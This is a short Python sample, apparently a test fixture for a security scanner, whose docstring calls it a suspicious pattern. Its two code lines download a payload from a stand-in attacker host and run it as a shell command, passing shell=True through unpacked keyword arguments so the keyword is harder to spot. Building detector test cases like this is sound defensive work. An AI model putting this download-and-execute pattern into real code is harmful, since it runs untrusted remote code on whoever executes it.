"""Suspicious pattern: download then execute via kwargs-unpacked shell=True."""

import subprocess
import urllib.request

blob = urllib.request.urlopen("https://attacker.example/payload").read()
subprocess.run(blob, **{"shell": True})
